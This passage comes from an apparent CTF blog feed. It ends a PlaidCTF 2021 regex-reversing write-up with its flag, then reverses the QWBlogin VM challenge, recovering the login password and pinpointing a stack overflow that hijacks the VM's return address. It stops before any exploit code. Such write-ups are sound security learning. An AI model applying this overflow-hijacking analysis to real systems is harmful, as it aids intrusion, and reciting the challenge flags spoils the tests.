href="#大致推测" class="headerlink" title="大致推测"></a>大致推测</h2><p>1 4 7得 <code>cdb</code> 的串长度只能为 4且只能为 <code>[b-f]cdb | cdb[cef]</code></p><p>主要4可以知道基本上是<code>数字+字符+数字+字符</code>的模式，又字符不能超过6个且连续的字符必须是1或者4个，因此要么是<code>1+4</code>要么是<code>4+1</code></p><p>再判断一下数字只能是<code>2+2 | 2+5 | 5+2 | 5+5</code>，又需要出现三次<code>10</code>，因此只能<code>[1010x|10x10|10] + [10xxx|x10xx|xx10x|xxx10]</code>或者这两个的顺序可以反过来即前面是一个<code>10</code>后面是两个<code>10</code></p><p> 因此<code>(a, b, c, d)</code>中</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>: <span class="hljs-number">1010</span>x | <span class="hljs-number">10</span>x<span class="hljs-number">10</span> | <span class="hljs-number">10</span><span class="hljs-attribute">b</span>:<span class="hljs-meta"> [b-f]cdb | cbd[cef]</span><span class="hljs-attribute">c</span>: <span class="hljs-number">10</span>xxx | x<span class="hljs-number">10</span>xx | xx<span class="hljs-number">10</span>x | xxx<span class="hljs-number">10</span><span class="hljs-attribute">d</span>: bcd</code></pre><p>且<code>a c</code>可交换，<code>b d</code>可交换，然后必须要<code>10</code>开头，必须要3个<code>10</code>，不能出现<code>73</code>，且两个<code>Consider</code>需要满足</p><p>因此可以写出脚本爆破，最后可以得到一堆可能的解</p><p>最后可行的结果</p><pre><code class="hljs apache"><span class="hljs-attribute">cough</span><span class="hljs-attribute">10174cdbf10810c</span><span class="hljs-attribute">PCTF</span>&#123;a_pr<span class="hljs-number">1</span>m<span class="hljs-number">3</span>_a_day_k<span class="hljs-number">33</span>ps_th<span class="hljs-number">3</span>_D<span class="hljs-number">0</span>ctor_Firmly_Away&#125;</code></pre><p>附上题目和脚本 <a href="https://github.com/Vang3lis/CTF_repo/tree/master/PlaidCTF_2021/dr">dr</a></p><p>我的脚本写的十分的暴力（无限套for循环），巨神写的就很简单</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>reg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p><p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//链表结构 可能记录 segment flag 的</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p><h4 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="简易-emulator"><a href="#简易-emulator" class="headerlink" title="简易 emulator"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p><p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" 